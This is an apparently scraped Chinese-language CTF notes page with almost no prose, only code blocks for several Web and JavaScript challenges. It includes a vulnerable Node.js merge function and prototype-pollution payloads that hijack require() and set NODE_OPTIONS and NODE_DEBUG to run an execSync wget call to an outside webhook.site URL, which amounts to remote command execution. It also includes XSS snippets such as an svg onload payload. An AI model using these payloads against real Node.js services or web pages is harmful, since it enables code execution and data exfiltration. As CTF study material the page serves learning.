# 幾個與 Web 跟 JS 相關的 CTF 題目小記

> 原文: https://www.ctfiot.com/84742.html
> ID: 84742


```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
#!/usr/local/bin/node
process.stdin.setEncoding('utf-8');
process.stdin.on('readable', () => {
 try{
 console.log('HTTP/1.1 200 OK\nContent-Type: text/html\nConnection: Close\n');
 const json = process.stdin.read().match(/\?(.*?)\ /)?.[1],
 obj = JSON.parse(json);
 console.log(`JSON: ${json}, Object:`, require('./index')(obj, {}));
 }catch (e) {
 require('./usage')
 }finally{
 process.exit();
 }
});

// index
module.exports=(O,o) => (
 Object.entries(O).forEach(
 ([K,V])=>Object.entries(V).forEach(
 ([k,v])=>(o[K]=o[K]||{},o[K][k]=v)
 )
 ), o
);
1
2
const { 1: name, 2: expansion = '' } =
 RegExpPrototypeExec(EXPORTS_PATTERN, request) || kEmptyObject;
1
const { data: pkg, path: pkgPath } = readPackageScope(parentPath) || {};
1
2
3
4
5
6
7
8
9
Object.prototype["data"] = {
 exports: {
 ".": "./pwn.js"
 },
 name: './usage.js'
}
Object.prototype["path"] = './'

require('./usage.js')
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
Object.prototype["data"] = {
 exports: {
 ".": "./preinstall.js"
 },
 name: './usage'
}
Object.prototype["path"] = '/opt/yarn-v1.22.19'
Object.prototype.shell = "node"
Object.prototype["npm_config_global"] = 1
Object.prototype.env = {
 "NODE_DEBUG": "console.log(require('child_process').execSync('wget${IFS}https://webhook.site/a0beafdc-df63-4804-85a8-7945ad473bf5?q=2').toString());process.exit()//",
 "NODE_OPTIONS": "--require=/proc/self/environ"
}

require('./usage.js')
1
2
3
var p = new Proxy({flag: window.flag || 'flag'}, {
 get: () => 'nope'
})
1
2
3
4
5
6
7
8
fastify.get("/api/notes/:
noteId", async (request, reply) => {
 const user = new User(request.session.userId);
 if (request.headers["x-token"] !== hash(user.id)) {
 throw new Error("Invalid token");
 }
 const noteId = validate(request.params.noteId);
 return user.sendNote(reply, noteId);
});
1
2
element.innerHTML = ''
console.log(2)
1
2
3
const div = document.createElement('div')
div.innerHTML = '<svg><svg onload=console.log(1)>'
console.log(2)
1
2
3
window.addEventListener('unhandledrejection', e => {
	console.log(e.reason.stack.match(/\/message\/(\w+)/)[1]);
});
```
